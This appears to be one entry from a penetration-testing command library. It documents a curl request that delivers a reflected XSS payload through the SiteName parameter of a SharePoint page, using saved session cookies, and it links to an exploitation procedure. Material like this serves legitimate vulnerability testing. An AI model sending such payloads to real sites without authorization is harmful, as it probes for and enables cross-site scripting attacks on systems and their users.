---
id: cmd-curl-access-xss-url
data: >-
  curl
  "https://target-site.com/Pages/default.aspx?FollowSite=0&SiteName=%27-confirm(%27XSSALERT%27)-%27"
  -b "cookies.txt" -v
tags:
  - xss
  - web
  - testing
type: command
output: >-
  HTTP response with reflected payload; potential JS execution indicators in
  verbose output
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T00:11:15.757Z'
verified: false
validated: true
submitted: true
---
# curl-access-xss-url

## Command

```bash
curl "https://target-site.com/Pages/default.aspx?FollowSite=0&SiteName=%27-confirm(%27XSSALERT%27)-%27" -b "cookies.txt" -v
```

## Description

This command uses curl to access a SharePoint page with an injected XSS payload in the SiteName parameter, simulating delivery while maintaining an authenticated session via cookies. It's used to test reflective XSS vulnerabilities by sending a crafted URL and observing the response for payload reflection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Full target URL with encoded payload in SiteName | Yes |
| -b, --cookie | File containing session cookies for authentication | Yes |
| -v, --verbose | Enable verbose output to see request/response details | No |

## Examples

### Basic Usage

```bash
curl "https://target-site.com/Pages/default.aspx?FollowSite=0&SiteName=%27-confirm(%27XSSALERT%27)-%27" -b "cookies.txt"
```

### Advanced Usage

```bash
curl "https://target-site.com/Pages/default.aspx?FollowSite=0&SiteName=%27-confirm(%27XSSALERT%27)-%27" -b "cookies.txt" -v -H "User-Agent: Mozilla/5.0"
```

## Expected Output

A successful run returns the HTTP response (200 OK) with the page content reflecting the payload (e.g., visible 'confirm('XSSALERT')' in HTML). Verbose mode shows headers and any errors. In a browser equivalent, a JS confirm dialog would appear; here, check for reflected strings indicating execution potential.

## Related

- [[Related Procedure: Exploit-Reflective-XSS-in-SharePoint-SiteName]]
